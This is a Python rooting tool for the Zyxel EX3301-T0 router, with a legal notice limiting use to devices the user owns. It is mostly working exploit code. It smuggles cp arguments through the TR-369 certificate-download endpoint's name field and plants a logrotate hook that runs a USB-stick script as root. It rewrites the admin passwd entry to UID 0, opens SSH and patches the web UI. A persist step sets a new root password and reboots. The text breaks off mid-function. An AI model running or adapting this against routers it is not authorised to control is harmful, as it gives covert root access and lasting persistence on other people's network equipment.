#!/usr/bin/env python3
"""zyxel-godmode: persistent root + full Web UI for the Zyxel EX3301-T0.

One script, no blobs. It reuses the authenticated TR-369 certificate-copy
endpoint to plant a one-time logrotate hook on the router; the hook gives a
UID-0 admin, LAN SSH, and an unhidden Web UI from a USB stick payload.
`persist` then writes only the router's user-data config so the stock
dropbear starts root SSH at every boot. After that, no USB stick, no Deck
watcher, and no third-party caller is needed.

Workflow:
  1. Stick in ROUTER:  ./zyxel-godmode.py extract
  2. Stick in DECK:    ./zyxel-godmode.py stage /mount/point
  3. Stick in ROUTER:  ./zyxel-godmode.py restore   (one-time root, ~5 min)
  4. Persist:          ./zyxel-godmode.py persist   (config-only, survives reboot)
  5. Check:            ./zyxel-godmode.py status
  6. Optional undo:    ./zyxel-godmode.py depersist

`persist` generates a root password, saves it to ~/.zyxel-root (0600), and
prints where it is. It backs up the config locally, on the router, and to the
USB stick if one is present. `depersist` restores the backup.

Requirements: python3, requests, pycryptodome, openssl.

LEGAL - READ FIRST (full notice in LEGAL.md; not legal advice):
  * You will use this ONLY on devices you own or are expressly authorised
    to administer. Accessing anyone else's device/network is a criminal
    offence in most jurisdictions (UK Computer Misuse Act 1990, US CFAA,
    EU equivalents). Many units of this model are ISP-owned: check your
    contract before touching one, or use a purchased unit.
  * Anti-circumvention law may apply (DMCA 1201, EU 2001/29/EC Art. 6).
  * The one-time root path writes no firmware or bootloader data; it uses
    volatile tmpfs and a removable USB stick. `persist` writes only the
    user-data configuration partition (/data/zcfg_config.json), never the
    firmware or bootloader. Backups are saved; `depersist` or a factory
    reset reverts it. That reduces technical risk only - it does not remove
    contractual or legal risk (breach of terms, void warranty, service
    termination).
  * NO WARRANTY. NO LIABILITY. YOU INDEMNIFY THE AUTHORS. Bricked devices,
    lost service, and legal costs are your risk. See LEGAL.md sections 5-7.
  * Redistribution includes no proprietary firmware, device secrets,
    provider credentials, or third-party code.
"""
import argparse
import base64
import contextlib
import getpass
import io
import json
import os
import secrets
import shlex
import subprocess
import sys
import tempfile
import time
from urllib.parse import quote, urlparse

try:
    import requests
    import urllib3
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    sys.exit('missing dependency: pip install requests pycryptodome')

urllib3.disable_warnings()

AES_KEY = b'\x42' * 32
IV = b'\x42' * 16
APP_VERSION_TAG = 'godmode1'
DEFAULT_ROOT_PW_FILE = os.path.expanduser('~/.zyxel-root')
BACKUP_DIR = os.path.expanduser('~/.zyxel-godmode')
ROUTER_CONFIG = '/data/zcfg_config.json'
ROUTER_CONFIG_BACKUP = '/data/zcfg_config.pre_persist.bak'
PERSIST_TMP = '/tmp/zcfg_persist.json'

BOOT_SH = """#!/bin/sh
MNT=""
for d in /mnt/usb*; do
  [ -f "$d/payload/passwd" ] && MNT="$d"
done
[ -z "$MNT" ] && exit 1
cp "$MNT/payload/passwd" /etc/passwd
[ -f "$MNT/payload/orig_logrotate.conf" ] && cp "$MNT/payload/orig_logrotate.conf" /var/logrotate.d/sys_logrotate.conf
ps | grep -q "[d]ropbear" || dropbear -p 192.168.1.1:22
iptables -D INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT 2>/dev/null
iptables -I INPUT 1 -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT
if [ -f "$MNT/payload/index_hidden.html" ] && [ -f "$MNT/payload/app_patched.js" ]; then
  if ! mount | grep -q " /web "; then
    rm -rf /tmp/web
    cp -a /web /tmp/web
    cp "$MNT/payload/index_hidden.html" /tmp/web/index.html
    cp "$MNT/payload/app_patched.js" /tmp/web/static/js/app.js
    mount --bind /tmp/web /web
  fi
fi
echo "root hook applied from $MNT at $(date)" > /tmp/root_boot.log
"""

HOOK_LOGROTATE = """/tmp/root_trigger.log
{
 size=1
 rotate 1
 copytruncate
 postrotate
   for d in /mnt/usb*; do [ -f "$d/payload/boot.sh" ] && /bin/sh "$d/payload/boot.sh"; done
 endscript
}
"""

ORIG_LOGROTATE = """create
/var/log/*.log
{
 copytruncate
 size=32k
 rotate 1
}
"""

TRIGGER_LOG = "trigger\n"

FLAG_KEYS = (
    "'hideTELNET','hideFTP','hideDSL','hideOAM','hideMcast','hide802_1x',"
    "'hideCCWan','hideIGMP_MLD','hideEthPwmgmt','hideVoip','hideVoiceIVR',"
    "'hideVoiceSRTP','hide_SIPoverTLS'"
)

# (menu, title, title_m, id, link) — every server-stripped entry whose page
# route exists in the build. Entries for compiled-out pages (PacketCap,
# IPSecVPN, EoGRE, Avast, MAC/IP tables, GPON/Cellular status,
# MultipleConfig, SFPManagement, TWAMP, Rport, PortBinding) are omitted:
# they would only redirect back home.
MENU_ENTRIES = [
 ("network_setting",("Broadband","Network.sublist.Broadband","Broadband","Broadband")),
 ("network_setting",("Routing","Network.sublist.Routing","Routing","Routing")),
 ("network_setting",("QoS","Network.sublist.QoS","QoS","QoS")),
 ("network_setting",("IGMP/MLD","Network.sublist.IGMP","IGMP_MLD","IGMPMLD")),
 ("network_setting",("VLAN Group","Network.sublist.VlanGroup","Vlan_Group","VlanGroup")),
 ("network_setting",("Interface Grouping","Network.sublist.InterfaceGrouping","Interface_Grouping","InterfaceGrouping")),
 ("network_setting",("Tunnel Setting","Network.sublist.TunnelSetting","Tunnel_Setting","TunnelSetting")),
 ("network_setting",("Home Connectivity","Network.sublist.HomeConnectivity","Home_Connectivity","HomeConnectivity")),
 ("network_setting",("Networking","Network.sublist.Networking","Networking","Networking")),
 ("security",("MAC Filter","Security.sublist.MACFilter","MAC_Filter","MACFilter")),
 ("security",("IP Filter","Security.sublist.IPFilter","IP_Filter","IPFilter")),
 ("security",("Parental Control","Security.sublist.ParentalControl","Parental_Control","ParentalControl")),
 ("security",("Scheduler Rule","Security.sublist.SchedulerRule","Scheduler_Rule","SchedulerRule")),
 ("security",("Certificates","Security.sublist.Certificates","Certificates","Certificates")),
 ("security",("PPTP VPN","Security.sublist.PPTPVPN","PPTP_VPN","PPTPVPN")),
 ("security",("L2TP VPN","Security.sublist.VPN","VPN","VPN")),
 ("voip",("SIP","VoIP.sublist.SIP","SIP","SIP")),
 ("voip",("Phone","VoIP.sublist.Phone","Phone","Phone")),
 ("voip",("Call Rule","VoIP.sublist.CallRule","Call_Rule","CallRule")),
 ("system_monitor",("Log","System.sublist.Log","Log","Log")),
 ("system_monitor",("ARP Table","System.sublist.ARPTable","ARP_Table","ARPTable")),
 ("system_monitor",("Routing Table","System.sublist.RoutingTable","Routing_Table","RoutingTable")),
 ("system_monitor",("Multicast Status","System.sublist.MulticastStatus","McastSt","MulticastStatus")),
 ("system_monitor",("Multicast Status Table","System.sublist.MulticastStatusTable","McastStTable","MulticastStatusTable")),
 ("system_monitor",("IGMP Snooping Status","System.sublist.IgmpSnoopStatusTable","IgmpSnoopStTable","IgmpSnoopStatusTable")),
 ("system_monitor",("xDSL Statistics","System.sublist.xDSLStatistics","xDSL_Statistics","XDSLStatistics")),
 ("system_monitor",("Steering Status","System.sublist.SteeringStatus","Steering_Status","SteeringStatus")),
 ("system_monitor",("Cellular Statistics","System.sublist.CellularStatistics","WWAN_Statistics","CellularStatistics")),
 ("maintenance",("Operation Mode","Maintenance.sublist.OperationMode","Operation_Mode","OperationMode")),
 ("maintenance",("Remote Management","Maintenance.sublist.RemoteMGMT","Remote_MGMT","RemoteManagement")),
 ("maintenance",("SP Domain","Maintenance.sublist.SPDomain","SP_Domain","SPDomain")),
 ("maintenance",("TR069 Client","Maintenance.sublist.TR069Client","TR-069_Client","TR069Client")),
 ("maintenance",("TR369 Local Agent","Maintenance.sublist.TR369LocalAgent","TR369_LocalAgent","TR369LocalAgent")),
 ("maintenance",("ZyEE","Maintenance.sublist.ZyEE","ZyEE","ZyEE")),
 ("maintenance",("ESG","Maintenance.sublist.ESG","ESG","ESG")),
 ("maintenance",("SNMP","Maintenance.sublist.SNMP","SNMP","SNMP")),
 ("maintenance",("Time","Maintenance.sublist.Time","Time","Time")),
 ("maintenance",("Email Notification","Maintenance.sublist.EmailNotification","Email_Notify","EmailNotification")),
 ("maintenance",("Log Setting","Maintenance.sublist.LogSetting","Log_Setting","LogSetting")),
 ("maintenance",("Firmware Upgrade","Maintenance.sublist.FirmwareUpgrade","Firmware_Upgrade","FirmwareUpgrade")),
 ("maintenance",("Backup&Restore","Maintenance.sublist.BackupRestore","Backup_Restore","Backup")),
 ("maintenance",("Proximity Sensor","Maintenance.sublist.ProximitySensor","Proximity_Sensor","ProximitySensor")),
 ("maintenance",("GPON","Maintenance.sublist.GPON","Gpon","GPON")),
 ("maintenance",("EDNS","Maintenance.sublist.EDNS","EDNS","EDNS")),
 ("maintenance",("Port Mirror","Maintenance.sublist.PortMirrorMaintenance","PortMirror","PortMirror")),
]

FLAG_SCRIPT_TMPL = (
    "<script>(function(){setInterval(function(){"
    "var e=document.querySelector('#app'),v=e&&e.__vue__,s=v&&v.$store;"
    "if(!s||!s.state||!s.state.guiFlag)return;var f=s.state.guiFlag,k=[%s],c=0;"
    "for(var i=0;i<k.length;i++){if(k[i] in f&&f[k[i]]!==false){f[k[i]]=false;c++}}"
    "if(c){try{s.state.guiFlag=Object.assign({},f)}catch(x){}}"
    "},2000)})();</script>"
)


class ZyxelWeb:
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password
        self.r = requests.Session()
        self.r.trust_env = False
        self.r.verify = False
        self.sessionkey = None

    def _encrypt_request(self, data):
        cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)
        content = cipher.encrypt(pad(json.dumps(data).encode('ascii'), 16))
        return {
            'content': base64.b64encode(content).decode('ascii'),
            'iv': base64.b64encode(IV).decode('ascii'),
            'key': '',
        }

    def _decrypt_response(self, data):
        if 'iv' not in data or 'content' not in data:
            raise RuntimeError(f'router error response: {data}')
        iv = base64.b64decode(data['iv'])[:16]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(base64.b64decode(data['content'])), 16)

    def perform_login(self):
        res = self.r.get(f'{self.url}/getRSAPublickKey', timeout=10)
        pubkey = RSA.import_key(res.json()['RSAPublicKey'])
        enc_aes_key = PKCS1_v1_5.new(pubkey).encrypt(base64.b64encode(AES_KEY))
        login_data = {
            'Input_Account': self.user,
            'Input_Passwd': base64.b64encode(self.password.encode('ascii')).decode('ascii'),
            'RememberPassword': 0,
            'SHA512_password': False,
        }
        enc_request = self._encrypt_request(login_data)
        enc_request['key'] = base64.b64encode(enc_aes_key).decode('ascii')
        enc_response = self.r.post(f'{self.url}/UserLogin', json.dumps(enc_request), timeout=10)
        response = json.loads(self._decrypt_response(enc_response.json()))
        if response.get('result') == 'ZCFG_SUCCESS':
            self.sessionkey = response['sessionkey']
            return True
        print(f'[-] login failed: {response}')
        return False


def copy_via_handler(web, name):
    """Copy on the router via the TR-369 handler.

    With two operands, cp treats the destination as a directory and
    appends the source basename — so destinations must be directories.
    Keeping `name` at 128 bytes truncates away the temp-file destination.
    """
    padded = name[:128].ljust(128, ' ')
    url = (
        f'{web.url}/cgi-bin/TR369Certificates?action=download'
        f'&name={quote(padded, safe="/")}&sessionkey={web.sessionkey}'
    )
    response = web.r.get(url, timeout=25)
    return response.status_code, response.headers.get('Content-Type', ''), len(response.content)


def patch_app_js(stock):
    """Force hidden flags off + restore stripped menu entries."""
    old_flag = 'updateGuiFlag:function(e,t){e.guiFlag=t}'
    if stock.count(old_flag) != 1:
        raise ValueError('flag mutation not found exactly once; firmware differs')
    new_flag = (
        'updateGuiFlag:function(e,t){var k=[' + FLAG_KEYS + '];'
        'if(t){for(var i=0;i<k.length;i++){if(k[i] in t)t[k[i]]=!1}'
        "console.log('ROOT_UI_PATCH DSL='+t.hideDSL+' TELNET='+t.hideTELNET+' FTP='+t.hideFTP)}"
        'e.guiFlag=t}'
    )
    stock = stock.replace(old_flag, new_flag)
    restore = (
        'function(L){try{'
        'function M(t){for(var i=0;i<L.length;i++){if(L[i].menutitle===t)return L[i]}return null}'
        'function add(t,e){var m=M(t);if(m&&m.submenu){'
        'for(var i=0;i<m.submenu.length;i++){if(m.submenu[i].id===e.id)return}'
        'm.submenu.push(e)}}'
    )
    for menu, (title, tm, iid, link) in MENU_ENTRIES:
        restore += (
            f'add("{menu}",{{title:"{title}",title_m:"{tm}",'
            f'id:"{iid}",link:"{link}"}});'
        )
    restore += '}catch(x){}return L}'
    old_commit = 'v.a.commit("updateMenuList",e.MenuList)'
    if stock.count(old_commit) != 1:
        raise ValueError('MenuList commit not found exactly once; firmware differs')
    return stock.replace(old_commit, 'v.a.commit("updateMenuList",' + restore + '(e.MenuList))')


def patch_index(html, tag=APP_VERSION_TAG):
    """Cache-bust app.js + add a flag-override fallback script."""
    marker = '/static/js/app.js'
    if marker not in html:
        raise ValueError('app.js reference not found in index.html')
    html = html.replace(marker, marker + f'?v={tag}', 1)
    if '<!--ROOT_UI_PATCH_FALLBACK-->' not in html:
        fallback = FLAG_SCRIPT_TMPL % FLAG_KEYS
        html = html.replace('</body>', '<!--ROOT_UI_PATCH_FALLBACK-->' + fallback + '</body>')
    return html


def validate_passwd(data):
    lines = data.decode('ascii').splitlines()
    entries = [line.split(':') for line in lines if line.count(':') == 6]
    if len(entries) < 3:
        raise ValueError('not a valid passwd file')
    by_name = {e[0]: e for e in entries}
    if by_name.get('root', [None, None, None])[2] != '0':
        raise ValueError('no root UID 0 entry')
    if 'admin' not in by_name:
        raise ValueError('no admin entry')
    return entries


def make_payload_passwd(base_text):
    out = []
    changed = 0
    for line in base_text.splitlines():
        fields = line.split(':')
        if fields[0] == 'admin' and len(fields) == 7:
            fields[2] = '0'
            fields[3] = '0'
            fields[6] = '/bin/sh'
            line = ':'.join(fields)
            changed += 1
        out.append(line)
    if changed != 1:
        raise ValueError('expected exactly one admin entry')
    return '\n'.join(out) + '\n'


def get_password(args):
    if args.password_file:
        with open(args.password_file, 'r', encoding='ascii') as f:
            for line in f:
                if line.startswith('password='):
                    return line.split('=', 1)[1].strip()
                if line.strip() and '=' not in line:
                    return line.strip()
        raise ValueError('no password found in password file')
    if os.environ.get('ZYXEL_ADMIN_PASSWORD'):
        return os.environ['ZYXEL_ADMIN_PASSWORD']
    return getpass.getpass('Router web-admin password (hidden, never stored): ')


def login(args, password=None):
    web = ZyxelWeb(args.host, 'admin', password or get_password(args))
    with contextlib.redirect_stdout(io.StringIO()):
        ok = web.perform_login()
    if not ok:
        sys.exit('Login failed; check the admin password.')
    return web


def ssh_uid0(timeout=8, password=None):
    """Legacy check: admin account must be UID 0 (hook payload active)."""
    if password:
        ok, out, err = ssh_run('admin', password, '192.168.1.1', 'id', timeout=timeout + 20)
        detail = (out or err).strip().splitlines()[-1][:120] if (out or err).strip() else ''
        return ok and 'uid=0' in out, detail or f'exit={0 if ok else 1}'
    env = dict(os.environ)
    askpass = os.environ.get('SSH_ASKPASS', '/tmp/exfw/.askpass')
    env.update({'SSH_ASKPASS': askpass, 'SSH_ASKPASS_REQUIRE': 'force', 'DISPLAY': ':0'})
    try:
        result = subprocess.run(
            ['setsid', '-w', 'ssh', '-o', 'StrictHostKeyChecking=no',
             '-o', 'UserKnownHostsFile=/dev/null',
             '-o', 'PreferredAuthentications=password',
             '-o', 'PubkeyAuthentication=no',
             '-o', 'NumberOfPasswordPrompts=1',
             '-o', f'ConnectTimeout={timeout}',
             'admin@192.168.1.1', 'id'],
            env=env, capture_output=True, text=True, timeout=timeout + 20,
        )
    except Exception as exc:
        return False, type(exc).__name__
    ok = result.returncode == 0 and 'uid=0' in result.stdout
    return ok, result.stdout.strip().splitlines()[-1][:120] if result.stdout else f'exit={result.returncode}'


def ssh_host(args):
    return urlparse(args.host).hostname or '192.168.1.1'


def read_password_file(path):
    bare = None
    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if line.startswith('password='):
                return line.split('=', 1)[1].strip()
            if '=' not in line and bare is None:
                bare = line
    if bare is not None:
        return bare
    raise ValueError(f'no password in {path}')


def root_password(args, generate=False, rotate=False):
    """Resolve the root password, or generate and save a new one.

    Order: --root-password-file, $ZYXEL_ROOT_PASSWORD, ~/.zyxel-root.
    rotate=True ignores existing values and writes a fresh one to
    ~/.zyxel-root (used by `persist --rotate-root-password`).
    """
    if not rotate:
        if args.root_password_file:
            return read_password_file(args.root_password_file), args.root_password_file, False
        env = os.environ.get('ZYXEL_ROOT_PASSWORD')
        if env:
            return env, '$ZYXEL_ROOT_PASSWORD', False
        if os.path.exists(DEFAULT_ROOT_PW_FILE):
            return read_password_file(DEFAULT_ROOT_PW_FILE), DEFAULT_ROOT_PW_FILE, False
    if not generate:
        return None, None, False
    pw = secrets.token_urlsafe(12)
    write_private(DEFAULT_ROOT_PW_FILE, f'password={pw}\n')
    return pw, DEFAULT_ROOT_PW_FILE, True


def write_private(path, text):
    directory = os.path.dirname(path)
    if directory:
        os.makedirs(directory, mode=0o700, exist_ok=True)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        f.write(text)


def ssh_run(user, password, host, command, input_data=None, timeout=60):
    """Run one command over SSH with password auth. Returns (ok, out, err)."""
    fd, askpass = tempfile.mkstemp(prefix='zyxel-askpass-', suffix='.sh')
    try:
        os.fchmod(fd, 0o700)
        with os.fdopen(fd, 'w', encoding='ascii') as f:
            f.write('#!/bin/sh\nprintf "%s\\n" ' + shlex.quote(password) + '\n')
        env = dict(os.environ)
        env.update({
            'SSH_ASKPASS': askpass,
            'SSH_ASKPASS_REQUIRE': 'force',
            'DISPLAY': ':0',
        })
        cmd = [
            'setsid', '-w', 'ssh',
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null',
            '-o', 'PreferredAuthentications=password',
            '-o', 'PubkeyAuthentication=no',
            '-o', 'NumberOfPasswordPrompts=1',
            '-o', 'ConnectTimeout=8',
            f'{user}@{host}', command,
        ]
        result = subprocess.run(cmd, env=env, input=input_data,
                                capture_output=True, text=True, timeout=timeout)
        return result.returncode == 0, result.stdout or '', result.stderr or ''
    except subprocess.TimeoutExpired:
        return False, '', 'timeout'
    except Exception as exc:
        return False, '', f'{type(exc).__name__}: {exc}'
    finally:
        try:
            os.unlink(askpass)
        except OSError:
            pass


def ssh_root(args, command, password, input_data=None, timeout=60):
    return ssh_run('root', password, ssh_host(args), command, input_data, timeout)


def ssh_admin(args, command, password, input_data=None, timeout=60):
    return ssh_run('admin', password, ssh_host(args), command, input_data, timeout)


def find_account(cfg, username):
    for group in cfg.get('X_ZYXEL_LoginCfg', {}).get('LogGp', []):
        for account in group.get('Account', []):
            if account.get('Username') == username:
                return account
    return None


def find_ssh_service(cfg):
    for service in cfg.get('X_ZYXEL_RemoteManagement', {}).get('Service', []):
        if service.get('Name') == 'SSH':
            return service
    return None


def shadow_last_change(old):
    for part in old.split(':')[1:]:
        if part.isdigit():
            return part
    return '19716'


def cmd_status(args):
    print(f'[*] router: {args.host}')
    try:
        web = login(args)
    except SystemExit as exc:
        print(f'[-] {exc}')
        return 2
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])]
    print(f'[*] USB volumes: {volumes}')
    try:
        root_pw, root_src, _ = root_password(args, generate=False)
    except Exception as exc:
        print(f'[-] could not read root password: {exc}')
        root_pw = None
    if root_pw:
        ok, out, err = ssh_root(args, 'id', root_pw)
        detail = (out or err).strip().splitlines()[-1][:120] if (out or err).strip() else ''
        print(f'[*] persistent root SSH: {"YES" if ok and "uid=0" in out else "NO"} ({detail})')
    else:
        print('[*] persistent root SSH: unknown (no ~/.zyxel-root; use --root-password-file)')
    legacy, legacy_detail = ssh_uid0()
    print(f'[*] legacy hook admin UID0: {"YES" if legacy else "NO"} ({legacy_detail})')
    try:
        served = requests.get(f'{args.host}/static/js/app.js', timeout=30, verify=False).text
        patched = 'updateMenuList",function(L)' in served or 'ROOT_UI_PATCH' in served
        print(f'[*] UI patch served: {"YES" if patched else "NO"}')
    except Exception as exc:
        print(f'[-] could not fetch app.js: {exc}')
    return 0


def cmd_extract(args):
    """Stick must be IN THE ROUTER. Copies live /etc/passwd to its root."""
    web = login(args)
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])
               if str(i.get('Volume', '')).startswith('usb')]
    if len(volumes) != 1:
        sys.exit(f'Refusing: expected one USB volume, found {volumes!r}')
    mount = '/mnt/' + volumes[0]
    status, ctype, _ = copy_via_handler(web, f'a /etc/passwd {mount}')
    print(f'[*] copy /etc/passwd -> USB root: HTTP {status}')
    if status != 200:
        sys.exit('Copy failed; nothing was changed.')
    print('[*] Done. Move the stick to this machine and run: stage <mountpoint>')


def cmd_stage(args):
    """Stick must be on THIS machine. Builds payload/ from the USB passwd."""
    mount = args.mount.rstrip('/')
    base_path = os.path.join(mount, 'passwd')
    if not os.path.isfile(base_path):
        sys.exit(f'No passwd file at {base_path}. Run extract first (stick in router).')
    with open(base_path, 'rb') as f:
        base_data = f.read()
    validate_passwd(base_data)
    payload = os.path.join(mount, 'payload')
    after = os.path.join(payload, 'after')
    os.makedirs(after, exist_ok=True)
    with open(os.path.join(payload, 'passwd'), 'w', encoding='ascii') as f:
        f.write(make_payload_passwd(base_data.decode('ascii')))
    with open(os.path.join(payload, 'boot.sh'), 'w', encoding='ascii') as f:
        f.write(BOOT_SH)
    os.chmod(os.path.join(payload, 'boot.sh'), 0o755)
    with open(os.path.join(payload, 'sys_logrotate.conf'), 'w', encoding='ascii') as f:
        f.write(HOOK_LOGROTATE)
    with open(os.path.join(payload, 'root_trigger.log'), 'w', encoding='ascii') as f:
        f.write(TRIGGER_LOG)
    with open(os.path.join(payload, 'orig_logrotate.conf'), 'w', encoding='ascii') as f:
        f.write(ORIG_LOGROTATE)
    print('[*] fetching stock web UI from the router (unauthenticated static files)...')
    host = args.host
    index_html = requests.get(f'{host}/', timeout=20, verify=False).text
    app_js = requests.get(f'{host}/static/js/app.js', timeout=60, verify=False).text
    with open(os.path.join(payload, 'index_hidden.html'), 'w', encoding='utf-8') as f:
        f.write(patch_index(index_html))
    with open(os.path.join(payload, 'app_patched.js'), 'w', encoding='utf-8') as f:
        f.write(patch_app_js(app_js))
    os.sync()
    print(f'[*] payload staged at {payload}. Move the stick back to the router, then run: restore')


def cmd_restore(args):
    """Stick must be IN THE ROUTER. Installs the hook and waits for root."""
    admin_pw = get_password(args)
    web = login(args, admin_pw)
    headers = {'CSRFToken': web.sessionkey}
    response = web.r.get(f'{args.host}/cgi-bin/DAL?oid=usb_info', headers=headers, timeout=15)
    info = json.loads(web._decrypt_response(response.json()))
    volumes = [i.get('Volume') for o in info.get('Object', []) for i in o.get('Usb Info', [])
               if str(i.get('Volume', '')).startswith('usb')]
    if len(volumes) != 1:
        sys.exit(f'Refusing: expected one USB volume, found {volumes!r}')
    mount = '/mnt/' + volumes[0]
    print(f'[*] USB volume: {mount}')
    for name in (f'a {mount}/payload/sys_logrotate.conf /var/logrotate.d',
                 f'a {mount}/payload/root_trigger.log /tmp'):
        status, _, _ = copy_via_handler(web, name)
        print(f'[*] {name!r} -> HTTP {status}')
        if status != 200:
            sys.exit('Handler rejected the request; nothing was changed.')
    print('[*] hook installed; waiting up to 6 minutes for the logrotate job...')
    deadline = time.time() + 360
    while time.time() < deadline:
        healthy, detail = ssh_uid0(password=admin_pw)
        if healthy:
            print(f'[*] ROOT RESTORED: {detail}')
            return 0
        time.sleep(15)
        print('    still waiting...')
    sys.exit('Timed out. Is the stick still inserted with a staged payload?')


def cmd_persist(args):
    """Write config-only persistent root: clean root shadow + LAN-only SSH."""
    try:
        old_root_pw, old_root_src, _ = root_password(args, generate=False)
    except Exception as exc:
        sys.exit(f'Could not read the root password: {exc}')
    transport = None
    if old_root_pw:
        ok, out, err = ssh_root(args, 'id', old_root_pw)
        if ok and 'uid=0' in out:
            transport = ('root', old_root_pw)
            print(f'[*] privileged shell: root SSH ({old_root_src})')
    if transport is None:
        try:
            admin_pw = get_password(args)
        except Exception as exc:
            sys.exit(f'Could not read the admin password: {exc}')
        ok, out, err = ssh_admin(args, 'id', admin_pw)
        if ok and 'uid=0' in out:
            transport = ('admin', admin_pw)
            print('[*] privileged shell: admin UID 0 (one-time hook)')
        else:
            print(f'[-] admin SSH check failed: {(err or out).strip()[:160]}')
    if transport is None:
        sys.exit('Need a privileged shell: run `restore` first (one-time USB hook), '
                 'or pass --root-password-file with the current root password.')
    user, password = transport

    ok, config_text, err = ssh_run(user, password, ssh_host(args), f'cat {ROUTER_CONFIG}')
    if not ok or not config_text.strip():
        sys.exit(f'Could not read {ROUTER_CONFIG}: {(err or config_text).strip()[:200]}')
    try:
        cfg = json.loads(config_text)
    except json.JSONDecodeError as exc:
        sys.exit(f'{ROUTER_CONFIG} is not valid JSON: {exc}')

    root_acct = find_account(cfg, 'root')
    ssh_svc = find_ssh_service(cfg)
    if root_acct is None:
        sys.exit('Root account not found in the login config; firmware differs.')
    if ssh_svc is None:
        sys.exit('Remote-management SSH service not found; firmware differs.')

    old_shadow = root_acct.get('shadow', '')
    lastchg = shadow_last_change(old_shadow)
    print('[*] planned persistent changes:')
    print(f'    root shadow: single SHA-512 hash, lastchange={lastchg}')
    print('    SSH service: Enable=true Mode=LAN_ONLY RestartDeamon=true password-auth=true')
    if args.dry_run:
        print('[*] dry run: nothing written.')
        return 0

    if args.rotate_root_password or old_root_pw is None:
        new_root_pw, new_root_src, _ = root_password(args, generate=True, rotate=True)
        if args.rotate_root_password and args.root_password_file:
            print('[*] note: --rotate-root-password writes the new password to '
                  '~/.zyxel-root, not to the file passed with --root-password-file.')
    else:
        new_root_pw, new_root_src = old_root_pw, old_root_src

    stamp = time.strftime('%Y%m%d-%H%M%S')
    local_backup = os.path.join(BACKUP_DIR, f'zcfg_config.{stamp}.json')
    write_private(local_backup, config_text)
    print(f'[*] local backup: {local_backup}')

    usb_backup = None
    ok, out, err = ssh_run(
        user, password, ssh_host(args),
        'for d in /mnt/usb*; do if [ -d "$d" ]; then '
        'cp /data/zcfg_config.json "$d/zcfg_config.pre_persist.bak" && echo "$d"; break; fi; done')
    if ok and out.strip():
        usb_backup = out.strip().splitlines()[-1] + '/zcfg_config.pre_persist.bak'
        print(f'[*] USB backup: {usb_backup}')
    else:
        print('[*] USB backup: skipped (no mounted USB volume)')

    try:
        hashed = subprocess.run(
            ['openssl', 'passwd', '-6', '-salt', secrets.token_hex(8), new_root_pw],
            capture_output=True, text=True, check=True).stdout.strip()
    except FileNotFoundError:
        sys.exit('openssl not found; install openssl to generate the SHA-512 hash.')
    except subprocess.CalledProcessError as exc:
        sys.exit(f'openssl passwd failed: {exc.stderr.strip()}')
    if not hashed.startswith('$6$'):
        sys.exit(f'openssl returned an unexpected hash: {hashed[:40]!r}')

    root_acct['Enabled'] = True
    root_acct['shadow'] = f'root:{hashed}:{lastchg}:0:99999:7:::'
    ssh_svc.update({
        'Enable': True,
        'Port': ssh_svc.get('Port', 22),
        'Mode': 'LAN_ONLY',
        'OldMode': 'LAN_ONLY',
        'RestartDeamon': True,
        'DisableSshPasswordLogin': False,
    })

    payload = json.dumps(cfg, ensure_ascii=False)
    ok, out, err = ssh_run(user, password, ssh_host(args), f'cat > {PERSIST_TMP}',
                           input_data=payload)
    if not ok:
        sys.exit(f'Could not upload the new config: {(err or out).strip()[:200]}')

    apply_cmd = (
        'set -e; '
        f'if [ ! -f {ROUTER_CONFIG_BACKUP} ]; then cp {ROUTER_CONFIG} {ROUTER_CONFIG_BACKUP}; fi; '
        'killall -9 zcmd 2>/dev/null || true; sleep 1; '
        f'cp {PERSIST_TMP} {ROUTER_CONFIG}; '
        f'chmod 700 {ROUTER_CONFIG}; chown root:root {ROUTER_CONFIG}; sync'
    )
    if not args.no_reboot:
        apply_cmd += '; (sleep 2; reboot) >/dev/null 2>&1 & echo rebooting'
    ok, out, err = ssh_run(user, password, ssh_host(args), apply_cmd, timeout=60)
    if not ok:
        sys.exit(f'Could not apply the config: {(err or out).strip()[:200]}')
    if args.no_reboot:
        print('[*] config written. Reboot the router to apply; then use the new root password.')
        return 0

    print(f'[*] rebooting; waiting up to {args.timeout}s for persistent root...')
    deadline = time.time() + args.timeout
    last_detail = ''
    while time.time() < deadline:
        ok, out, err = ssh_root(args, 'id', new_root_pw, timeout=12)
        if ok and 'uid=0' in out:
            print('[*] root SSH is back.')
            break
        last_detail = (err or out).strip().splitlines()[-1][:120] if (err or out).strip() else ''
        time.sleep(10)
        print('    still waiting...')
    else:
        sys.exit(f'Timed out after {args.timeout}s. Backups: {local_backup}, '
                 f'{ROUTER_CONFIG_BACKUP}' + (f', {usb_backup}' if usb_backup else '') +
                 f'. Last error: {last_detail}')

    checks = {}
    ok, out, _ = ssh_root(args, 'id -u', new_root_pw)
    checks['uid'] = out.strip() if ok else ''
    ok, out, _ = ssh_root(args, "grep '^admin:' /etc/passwd", new_root_pw)
    checks['admin'] = out.strip() if ok else ''
    ok, out, _ = ssh_root(args, 'test -e /tmp/root_boot.log && echo PRESENT || echo ABSENT', new_root_pw)
    checks['hook'] = out.strip() if ok else ''
    ok, out, _ = ssh_root(args, "grep -c 'payload/boot.sh' /var/logrotate.d/sys_logrotate.conf 2>/dev/null || true", new_root_pw)
